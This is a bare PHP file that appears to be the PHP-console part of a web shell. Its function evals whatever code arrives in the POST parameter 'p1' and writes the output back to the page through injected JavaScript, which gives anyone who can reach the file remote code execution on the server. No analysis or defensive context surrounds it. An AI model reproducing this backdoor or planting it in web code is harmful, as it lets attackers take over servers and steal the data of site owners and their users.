<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
	echo $temp;
}

call_user_func('actionPhp');
?>